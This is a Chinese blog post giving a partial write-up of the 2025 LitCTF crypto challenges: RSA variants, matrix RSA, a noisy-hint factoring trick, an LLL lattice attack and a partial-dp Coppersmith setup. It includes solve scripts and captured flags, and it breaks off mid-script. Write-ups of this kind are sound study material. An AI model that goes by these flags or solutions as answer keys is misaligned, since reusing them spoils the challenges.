<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"zh1yu.xyz","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="æ„Ÿè§‰é¢˜ç›®å‡ºå¾—å¾ˆå¥½ï¼Œå¯æƒœå°±æ˜¯è‡ªå·±å¤ªèœäº†ğŸ˜­">
<meta property="og:type" content="article">
<meta property="og:title" content="2025LitCTFéƒ¨åˆ†wp">
<meta property="og:url" content="http://zh1yu.xyz/2025/05/25/2025LitCTF%E9%83%A8%E5%88%86wp/index.html">
<meta property="og:site_name" content="çŸ¥é±¼çš„Blog">
<meta property="og:description" content="æ„Ÿè§‰é¢˜ç›®å‡ºå¾—å¾ˆå¥½ï¼Œå¯æƒœå°±æ˜¯è‡ªå·±å¤ªèœäº†ğŸ˜­">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://zh1yu.xyz/2025/05/25/2025LitCTF%E9%83%A8%E5%88%86wp/1.png">
<meta property="og:image" content="http://zh1yu.xyz/2025/05/25/2025LitCTF%E9%83%A8%E5%88%86wp/2.png">
<meta property="og:image" content="http://zh1yu.xyz/2025/05/25/2025LitCTF%E9%83%A8%E5%88%86wp/3.png">
<meta property="og:image" content="http://zh1yu.xyz/2025/05/25/2025LitCTF%E9%83%A8%E5%88%86wp/4.png">
<meta property="article:published_time" content="2025-05-25T10:45:04.000Z">
<meta property="article:modified_time" content="2025-06-05T13:24:58.773Z">
<meta property="article:author" content="zh1yu">
<meta property="article:tag" content="æ¯”èµ›wp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://zh1yu.xyz/2025/05/25/2025LitCTF%E9%83%A8%E5%88%86wp/1.png">

<link rel="canonical" href="http://zh1yu.xyz/2025/05/25/2025LitCTF%E9%83%A8%E5%88%86wp/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>2025LitCTFéƒ¨åˆ†wp | çŸ¥é±¼çš„Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="åˆ‡æ¢å¯¼èˆªæ ">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">çŸ¥é±¼çš„Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="home fa-fw"></i>é¦–é¡µ</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>å½’æ¡£</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="th fa-fw"></i>åˆ†ç±»</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="user fa-fw"></i>å…³äº</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://zh1yu.xyz/2025/05/25/2025LitCTF%E9%83%A8%E5%88%86wp/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/zh1yu2.jpg">
      <meta itemprop="name" content="zh1yu">
      <meta itemprop="description" content="èŠ±æœ‰é‡å¼€æ—¥,äººæ— å†å°‘å¹´">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="çŸ¥é±¼çš„Blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          2025LitCTFéƒ¨åˆ†wp
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2025-05-25 18:45:04" itemprop="dateCreated datePublished" datetime="2025-05-25T18:45:04+08:00">2025-05-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2025-06-05 21:24:58" itemprop="dateModified" datetime="2025-06-05T21:24:58+08:00">2025-06-05</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%AF%94%E8%B5%9Bwp/" itemprop="url" rel="index"><span itemprop="name">æ¯”èµ›wp</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>æ„Ÿè§‰é¢˜ç›®å‡ºå¾—å¾ˆå¥½ï¼Œå¯æƒœå°±æ˜¯è‡ªå·±å¤ªèœäº†ğŸ˜­</p>
<span id="more"></span>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="basic"><a href="#basic" class="headerlink" title="basic"></a>basic</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> enc <span class="keyword">import</span> flag </span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">n = getPrime(<span class="number">1024</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>æ³¨æ„ï¼šè¿™é‡Œphiå°±æ˜¯n-1</p>
<p>EXPï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n = <span class="number">150624321883406825203208223877379141248303098639178939246561016555984711088281599451642401036059677788491845392145185508483430243280649179231349888108649766320961095732400297052274003269230704890949682836396267905946735114062399402918261536249386889450952744142006299684134049634061774475077472062182860181893</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">22100249806368901850308057097325161014161983862106732664802709096245890583327581696071722502983688651296445646479399181285406901089342035005663657920475988887735917901540796773387868189853248394801754486142362158369380296905537947192318600838652772655597241004568815762683630267295160272813021037399506007505</span></span><br><span class="line"></span><br><span class="line">d=gmpy2.invert(e,n-<span class="number">1</span>)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># LitCTF&#123;ee2c30dfe684f13a6e6c07b9ec90cc2c&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="ez-math"><a href="#ez-math" class="headerlink" title="ez_math"></a>ez_math</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> uuid <span class="keyword">import</span> uuid4</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;LitCTF&#123;&#x27;</span>+ <span class="built_in">str</span>(uuid4()).encode() + <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">flag = bytes_to_long(flag)</span><br><span class="line">len_flag = flag.bit_length()</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">P = GF(p)</span><br><span class="line">A = [[flag,                 getPrime(len_flag)],</span><br><span class="line">     [getPrime(len_flag),   getPrime(len_flag)]]</span><br><span class="line">A = matrix(P, A)</span><br><span class="line">B = A ** e</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;B = <span class="subst">&#123;<span class="built_in">list</span>(B)&#125;</span>&quot;</span>.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;[&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;]&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p>åœ¨æœ‰é™åŸŸä¸Šåšrsaè¿ç®—ï¼Œè¿™é‡Œä¸æ­£å¸¸rsaè¿ç®—æ²¡ä»€ä¹ˆåŒºåˆ«ï¼Œæ— éæ˜¯åŠ å¯†å†…å®¹å˜æˆçŸ©é˜µè€Œå·²</p>
<p>EXPï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">8147594556101158967571180945694180896742294483544853070485096002084187305007965554901340220135102394516080775084644243545680089670612459698730714507241869</span></span><br><span class="line">B = [[<span class="number">2155477851953408309667286450183162647077775173298899672730310990871751073331268840697064969968224381692698267285466913831393859280698670494293432275120170</span>, <span class="number">4113196339199671283644050914377933292797783829068402678379946926727565560805246629977929420627263995348168282358929186302526949449679561299204123214741547</span>], [<span class="number">3652128051559825585352835887172797117251184204957364197630337114276860638429451378581133662832585442502338145987792778148110514594776496633267082169998598</span>, <span class="number">2475627430652911131017666156879485088601207383028954405788583206976605890994185119936790889665919339591067412273564551745588770370229650653217822472440992</span>]]</span><br><span class="line"></span><br><span class="line">P = GF(p)</span><br><span class="line">d=gmpy2.invert(e,p-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">B = matrix(P, B)</span><br><span class="line">A = B ** d</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(A[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(A[<span class="number">0</span>][<span class="number">0</span>])))</span><br><span class="line"></span><br><span class="line"><span class="comment"># LitCTF&#123;13dd217e-9a67-4093-8a1b-d2592c45ba82&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="math"><a href="#math" class="headerlink" title="math"></a>math</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> enc <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p,q = getPrime(<span class="number">1024</span>),getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p*q</span><br><span class="line">noise = getPrime(<span class="number">40</span>)</span><br><span class="line">tmp1 = noise*p+noise*q</span><br><span class="line">tmp2 = noise*noise</span><br><span class="line">hint = p*q+tmp1+tmp2</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;hint = <span class="subst">&#123;hint&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>æ€è·¯ï¼šåŒ–ç®€å<script type="math/tex">hint-n=noise(p+q+noise)</script>ï¼Œè¿™é‡Œp+qå‰æœ‰ä¸ªæœªçŸ¥æ•°noiseï¼Œå¦‚æœæ²¡æœ‰çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥å³ç§»noiseçš„äºŒè¿›åˆ¶ä½æ•°ï¼Œç„¶ååšp+qé«˜ä½æ”»å‡»çš„copperå°±å¯ä»¥ï¼Œä½†è¿™é‡Œæœ‰ä¸ªç³»æ•°å°±å¾ˆéš¾åŠï¼Œä½†æ²¡æƒ³åˆ°<script type="math/tex">hint-n</script>å¯ä»¥åˆ†è§£å‡ºæ¥noiseï¼Œè¿™ä¸‹å°±å¯ä»¥ç›´æ¥è§£å‡ºæ¥äº†ï¼Œæ„Ÿè§‰åƒéé¢„æœŸ</p>
<p>EXPï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n = <span class="number">17532490684844499573962335739488728447047570856216948961588440767955512955473651897333925229174151614695264324340730480776786566348862857891246670588649327068340567882240999607182345833441113636475093894425780004013793034622954182148283517822177334733794951622433597634369648913113258689335969565066224724927142875488372745811265526082952677738164529563954987228906850399133238995317510054164641775620492640261304545177255239344267408541100183257566363663184114386155791750269054370153318333985294770328952530538998873255288249682710758780563400912097941615526239960620378046855974566511497666396320752739097426013141</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">1443781085228809103260687286964643829663045712724558803386592638665188285978095387180863161962724216167963654290035919557593637853286347618612161170407578261345832596144085802169614820425769327958192208423842665197938979924635782828703591528369967294598450115818251812197323674041438116930949452107918727347915177319686431081596379288639254670818653338903424232605790442382455868513646425376462921686391652158186913416425784854067607352211587156772930311563002832095834548323381414409747899386887578746299577314595641345032692386684834362470575165392266454078129135668153486829723593489194729482511596288603515252196</span></span><br><span class="line">hint = <span class="number">17532490684844499573962335739488728447047570856216948961588440767955512955473651897333925229174151614695264324340730480776786566348862857891246670588649327068340567882240999607182345833441113636475093894425780004013793034622954182148283517822177334733794951622433597634369648913113258689335969565315879035806034866363781260326863226820493638303543900551786806420978685834963920605455531498816171226961859405498825422799670404315599803610007692517859020686506546933013150302023167306580068646104886750772590407299332549746317286972954245335810093049085813683948329319499796034424103981702702886662008367017860043529164</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#hint-n=noise(p+q+noise)</span></span><br><span class="line"><span class="comment">#æ²¡æƒ³åˆ°èƒ½ä»hint-nåˆ†è§£å‡ºæ¥noise</span></span><br><span class="line">noise=<span class="number">942430120937</span></span><br><span class="line">p_plus_q=(hint-n)//noise-noise</span><br><span class="line">phi=n-p_plus_q+<span class="number">1</span></span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># LitCTF&#123;db6f52b9265971910b306754b9df8b76&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="baby"><a href="#baby" class="headerlink" title="baby"></a>baby</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> enc <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">g = getPrime(<span class="number">512</span>)</span><br><span class="line">t = getPrime(<span class="number">150</span>)</span><br><span class="line">data = (t * gmpy2.invert(m, g)) % g</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;g = <span class="subst">&#123;g&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;data = <span class="subst">&#123;data&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">g = 7835965640896798834809247993719156202474265737048568647376673642017466116106914666363462292416077666356578469725971587858259708356557157689066968453881547</span></span><br><span class="line"><span class="string">data = 2966297990428234518470018601566644093790837230283136733660201036837070852272380968379055636436886428180671888655884680666354402224746495312632530221228498</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>å¹³å¹³æ— å¥‡çš„æ ¼ï¼Œåªéœ€è¦é…å¹³ä¸€ä¸‹å°±å¯ä»¥ï¼Œæ³¨æ„è¿™é‡Œæ˜¯é…åˆ°dataä¸Šï¼Œè€Œä¸æ˜¯æŠŠ1æ¢æˆå…¶ä»–æ•°</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#flagé•¿åº¦40*8</span></span><br><span class="line"><span class="comment">#m*data=t %g</span></span><br><span class="line"><span class="comment">#m*data+k*g=t</span></span><br><span class="line"><span class="comment">#å·²çŸ¥data å’Œg</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [m,k][1,x*data]=[m,x*t]</span></span><br><span class="line"><span class="comment">#      [0,x*g] </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">x=<span class="number">2</span>**<span class="number">150</span></span><br><span class="line">g = <span class="number">7835965640896798834809247993719156202474265737048568647376673642017466116106914666363462292416077666356578469725971587858259708356557157689066968453881547</span></span><br><span class="line">data = <span class="number">2966297990428234518470018601566644093790837230283136733660201036837070852272380968379055636436886428180671888655884680666354402224746495312632530221228498</span></span><br><span class="line"></span><br><span class="line">Ge = Matrix(ZZ, [[<span class="number">1</span>, x*data], [<span class="number">0</span>, x*g]])</span><br><span class="line">m,x_mul_t= <span class="built_in">abs</span>(Ge.LLL()[<span class="number">0</span>][<span class="number">0</span>]), <span class="built_in">abs</span>(Ge.LLL()[<span class="number">0</span>][<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#LitCTF&#123;56008a819331c9f3608a718327b7e6ce&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> enc <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p,q,e = getPrime(<span class="number">1024</span>),getPrime(<span class="number">1024</span>),getPrime(<span class="number">101</span>)</span><br><span class="line">n = p*q                                                                                                                                       </span><br><span class="line">temp=gmpy2.invert(e,p-<span class="number">1</span>)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">hint = temp&gt;&gt;<span class="number">180</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;hint = <span class="subst">&#123;hint&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">e = 1915595112993511209389477484497</span></span><br><span class="line"><span class="string">n = 12058282950596489853905564906853910576358068658769384729579819801721022283769030646360180235232443948894906791062870193314816321865741998147649422414431603039299616924238070704766273248012723702232534461910351418959616424998310622248291946154911467931964165973880496792299684212854214808779137819098357856373383337861864983040851365040402759759347175336660743115085194245075677724908400670513472707204162448675189436121439485901172477676082718531655089758822272217352755724670977397896215535981617949681898003148122723643223872440304852939317937912373577272644460885574430666002498233608150431820264832747326321450951</span></span><br><span class="line"><span class="string">c = 5408361909232088411927098437148101161537011991636129516591281515719880372902772811801912955227544956928232819204513431590526561344301881618680646725398384396780493500649993257687034790300731922993696656726802653808160527651979428360536351980573727547243033796256983447267916371027899350378727589926205722216229710593828255704443872984334145124355391164297338618851078271620401852146006797653957299047860900048265940437555113706268887718422744645438627302494160620008862694047022773311552492738928266138774813855752781598514642890074854185464896060598268009621985230517465300289580941739719020511078726263797913582399</span></span><br><span class="line"><span class="string">hint = 10818795142327948869191775315599184514916408553660572070587057895748317442312635789407391509205135808872509326739583930473478654752295542349813847128992385262182771143444612586369461112374487380427668276692719788567075889405245844775441364204657098142930</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>æ€è·¯:<strong>è¿™é‡Œæˆ‘ä»¬ä¸€çœ‹åˆ°ç§»ä½,å°±åº”è¯¥æƒ³åˆ°copperå®šç†</strong></p>
<p><code>temp=gmpy2.invert(e,p-1)</code>è¿™é‡Œtempæ˜¯eæ¨¡n-1çš„é€†å…ƒ,è¿™é‡Œtempåº”è¯¥å°±æ˜¯dp,<code>temp*e=1 mod p-1</code>,<code>dp*e=1 mod p-1</code>,ä¸è¿‡è¿™é‡Œå¥½åƒæ²¡ä»€ä¹ˆç”¨,æˆ‘ä»¬å¯¹å…¶å˜å½¢</p>
<script type="math/tex; mode=display">
temp*e=1 \mod p-1</script><script type="math/tex; mode=display">
temp*e=k*(p-1)+1</script><script type="math/tex; mode=display">
temp*e-1+k=k*p</script><script type="math/tex; mode=display">
(hint<<180+temp\_low)-1+k=k*p</script><p>è¿™é‡Œæ„é€ å‡ºä¸€ä¸ªå…³äºpæ•´æ•°å€çš„å¤šé¡¹å¼,å¯ä»¥ç”±<script type="math/tex">f=0 \pmod n</script>è½¬åŒ–åˆ°<script type="math/tex">f=0 \pmod p</script>(å¤§æ¦‚å·²çŸ¥pæˆ–qé«˜ä½è¿˜åŸpå’Œqçš„åŸç†å°±æ˜¯è¿™æ ·è¶´),æ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡äºŒå…ƒcopperæ¥è§£å†³,è¿™é‡Œtemp_lowçš„ä½æ•°æ˜¯180,æˆ‘ä»¬æ¨¡æ‹Ÿä¸€ä¸‹è®¡ç®—å‡ºkçš„å¤§æ¦‚ä½æ•°</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">hint = <span class="number">10818795142327948869191775315599184514916408553660572070587057895748317442312635789407391509205135808872509326739583930473478654752295542349813847128992385262182771143444612586369461112374487380427668276692719788567075889405245844775441364204657098142930</span></span><br><span class="line">hint=hint&lt;&lt;<span class="number">180</span></span><br><span class="line">e=<span class="number">1915595112993511209389477484497</span></span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">k=e*hint//p</span><br><span class="line"><span 